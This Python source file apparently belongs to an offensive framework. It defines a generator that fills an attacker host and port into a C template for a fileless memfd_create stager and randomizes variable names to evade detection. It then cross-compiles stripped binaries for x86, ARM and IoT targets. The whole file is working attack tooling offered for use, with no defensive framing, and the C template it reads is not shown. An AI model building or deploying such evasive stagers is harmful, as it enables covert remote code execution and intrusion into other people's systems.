import os
import subprocess
import tempfile
import random
import string
import re

class CStagerGenerator:
    """
    Dynamically cross-compiles a C-based fileless memfd_create stager.
    Engineered for ultra-tight exploit buffers and IoT targets.
    """
    @staticmethod
    def generate(lhost, lport, arch="x86_64"):
        framework_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
        template_path = os.path.join(framework_root, "templates", "payload", "c_stager.c")
        output_dir = os.path.join(framework_root, "payloads", "stagers")
        os.makedirs(output_dir, exist_ok=True)
        
        output_bin = os.path.join(output_dir, f"c_stager_{arch}")

        if not os.path.exists(template_path):
            print(f"[-] C Stager Template not found at {template_path}")
            return None

        with open(template_path, "r") as f:
            c_code = f.read()

        # Inject Networking Context
        c_code = c_code.replace("{{LHOST}}", str(lhost))
        c_code = c_code.replace("{{LPORT}}", str(lport))

        # Polymorphic Variable Randomization
        variables_to_obfuscate = [
            "sock", "server", "mfd", "payload_size", "buffer", 
            "total_received", "bytes_read", "fd_path", "args"
        ]
        for var in variables_to_obfuscate:
            rand_name = random.choice(string.ascii_letters) + "".join(random.choices(string.ascii_letters + string.digits, k=11))
            c_code = re.sub(rf'\b{var}\b', rand_name, c_code)

        # Map architecture strings to their respective cross-compilers
        compilers = {
            "x86_64": "gcc",
            "x86": "gcc -m32",
            "armv7": "arm-linux-gnueabihf-gcc",
            "aarch64": "aarch64-linux-gnu-gcc"
        }
        compiler_cmd = compilers.get(arch, "gcc")

        with tempfile.NamedTemporaryFile(suffix=".c", delete=False) as temp_c:
            temp_c.write(c_code.encode())
            temp_c_path = temp_c.name

        try:
            # Compile, strip symbols (-s), and optimize for minimal size (-Os)
            cmd = compiler_cmd.split() + [temp_c_path, "-o", output_bin, "-s", "-Os"]
            subprocess.run(cmd, check=True, capture_output=True)
            
            size = os.path.getsize(output_bin)
            return output_bin
        except subprocess.CalledProcessError as e:
            print(f"[-] C Stager Compilation Failed (Ensure {compiler_cmd} is installed): {e.stderr.decode()}")
            return None
        finally:
            if os.path.exists(temp_c_path):
                os.remove(temp_c_path)